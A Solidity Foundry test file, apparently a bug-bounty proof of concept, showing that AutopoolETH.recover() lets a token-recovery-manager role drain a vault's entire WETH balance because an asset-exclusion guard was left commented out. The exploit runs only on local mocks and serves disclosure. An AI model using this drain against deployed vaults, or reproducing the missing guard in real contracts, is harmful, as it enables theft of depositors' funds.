// SPDX-License-Identifier: UNLICENSED
// PoC for candidate finding: AutopoolETH.recover() lets TOKEN_RECOVERY_MANAGER
// drain the vault's base asset (WETH). Local Foundry test only, no live target.
// Scope repo: ~/workspace/bugbounty/autofinance/scope-autofinance-v2-core @ de163d5a
// Root cause: src/vault/libs/Autopool4626.sol:145-175 — the tracked-asset
// exclusion guard is commented out (commit 9a19d48e, "temporarily remove recover
// restrictions", never restored), so recover() transfers ANY token held by the vault.
pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import { Clones } from "openzeppelin-contracts/proxy/Clones.sol";
import { Roles } from "src/libs/Roles.sol";
import { Errors } from "src/utils/Errors.sol";
import { SystemRegistry } from "src/SystemRegistry.sol";
import { AccessController } from "src/security/AccessController.sol";
import { SystemSecurityL1 } from "src/security/SystemSecurityL1.sol";
import { AutopoolRegistry } from "src/vault/AutopoolRegistry.sol";
import { AutopoolETH } from "src/vault/AutopoolETH.sol";
import { ERC20 } from "openzeppelin-contracts/token/ERC20/ERC20.sol";

/// Minimal mintable ERC20 standing in for WETH / TOKE (same shape as the
/// scope repo's test/mocks/TestERC20.sol, inlined to avoid a test/ remapping).
contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) { }

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
}

contract AutopoolRecoverPoC is Test {
    MockERC20 internal weth;
    MockERC20 internal toke;
    SystemRegistry internal registry;
    AccessController internal accessController;
    SystemSecurityL1 internal security;
    AutopoolRegistry internal autopoolRegistry;
    AutopoolETH internal vault;

    address internal user = makeAddr("user");
    address internal attacker = makeAddr("attacker");
    address internal stranger = makeAddr("stranger");
    address internal strategy = makeAddr("strategy"); // never called on the deposit path

    uint256 internal constant INIT_DEPOSIT = 100_000; // AutopoolETH.WETH_INIT_DEPOSIT
    uint256 internal constant USER_DEPOSIT = 100 ether;

    function setUp() public {
        weth = new MockERC20("Mock WETH", "mWETH");
        toke = new MockERC20("Mock TOKE", "mTOKE");

        registry = new SystemRegistry(address(toke), address(weth));
        accessController = new AccessController(address(registry));
        registry.setAccessController(address(accessController));

        security = new SystemSecurityL1(registry);
        registry.setSystemSecurity(address(security));

        autopoolRegistry = new AutopoolRegistry(registry);
        registry.setAutopoolRegistry(address(autopoolRegistry));

        AutopoolETH template = new AutopoolETH(registry, address(weth));
        vault = AutopoolETH(Clones.clone(address(template)));

        // initialize() deposits INIT_DEPOSIT from the caller
        weth.mint(address(this), INIT_DEPOSIT);
        weth.approve(address(vault), INIT_DEPOSIT);
        vault.initialize(strategy, "tETH", "Tokemak tETH", "");

        // register the vault (realistic deployment state)
        accessController.grantRole(Roles.AUTO_POOL_REGISTRY_UPDATER, address(this));
        autopoolRegistry.addVault(address(vault));

        // user deposits 100 WETH
        weth.mint(user, USER_DEPOSIT);
        vm.startPrank(user);
        weth.approve(address(vault), USER_DEPOSIT);
        vault.deposit(USER_DEPOSIT, user);
        vm.stopPrank();
    }

    function test_SetUpState() public {
        assertEq(weth.balanceOf(address(vault)), USER_DEPOSIT + INIT_DEPOSIT, "vault WETH before");
        assertEq(vault.totalAssets(), USER_DEPOSIT + INIT_DEPOSIT, "totalAssets before");
        assertEq(vault.balanceOf(user), USER_DEPOSIT, "user shares");
        assertFalse(vault.isShutdown(), "not shutdown");
        assertFalse(vault.paused(), "not paused");
    }

    function test_RecoveryManagerDrainsWholeVault() public {
        accessController.grantRole(Roles.TOKEN_RECOVERY_MANAGER, attacker);
        assertTrue(accessController.hasRole(Roles.TOKEN_RECOVERY_MANAGER, attacker), "attacker has role");
        // attacker holds NO admin / manager role
        assertFalse(accessController.hasRole(accessController.DEFAULT_ADMIN_ROLE(), attacker), "attacker not admin");
        assertFalse(accessController.hasRole(Roles.AUTO_POOL_MANAGER, attacker), "attacker not manager");

        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = USER_DEPOSIT;
        address[] memory destinations = new address[](1);
        destinations[0] = attacker;

        // 1) drain the user's 100 WETH — the base asset, on a live unpaused vault
        vm.prank(attacker);
        vault.recover(tokens, amounts, destinations);

        assertEq(weth.balanceOf(address(vault)), INIT_DEPOSIT, "vault WETH after 1st recover");
        assertEq(weth.balanceOf(attacker), USER_DEPOSIT, "attacker WETH after 1st recover");

        // 2) drain the remaining 100_000 wei init deposit too — 100% of vault WETH
        amounts[0] = INIT_DEPOSIT;
        vm.prank(attacker);
        vault.recover(tokens, amounts, destinations);

        assertEq(weth.balanceOf(address(vault)), 0, "vault WETH fully drained");
        assertEq(weth.balanceOf(attacker), USER_DEPOSIT + INIT_DEPOSIT, "attacker total drained");

        // vault was never shut down / paused, and the user still holds shares
        assertFalse(vault.isShutdown(), "still not shutdown");
        assertFalse(vault.paused(), "still not paused");
        assertEq(vault.balanceOf(user), USER_DEPOSIT, "user shares untouched");

        // NOTE: totalAssets() is accounting-based (totalIdle) and recover() never
        // updates it, so it still reports the drained funds as present:
        assertEq(vault.totalAssets(), USER_DEPOSIT + INIT_DEPOSIT, "totalAssets stale after drain");
    }

    function test_NonRoleCallerReverts() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = USER_DEPOSIT;
        address[] memory destinations = new address[](1);
        destinations[0] = stranger;

        vm.prank(stranger);
        vm.expectRevert(Errors.AccessDenied.selector);
        vault.recover(tokens, amounts, destinations);
    }
}
